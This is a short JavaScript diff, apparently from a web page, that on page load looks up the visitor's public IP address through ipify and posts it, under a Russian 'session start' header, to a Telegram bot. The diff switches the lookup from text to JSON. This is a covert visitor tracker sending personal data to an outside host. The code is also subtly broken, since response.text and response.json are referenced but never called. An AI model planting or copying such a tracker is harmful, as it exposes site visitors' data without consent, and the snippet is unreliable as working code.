@@ -5,10 +5,10 @@ const url = `https://api.telegram.org/bot${Token}/sendMessage`;
 let text = `Начало сеанса:\n`;
 
 window.onload = function() {
-    fetch('https://api.ipify.org?format=text')
-        .then(response => response.text)
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json)
         .then(data => {
-            text += data
+            text += data.ip
 
             fetch(url, {
                 method:'POST',
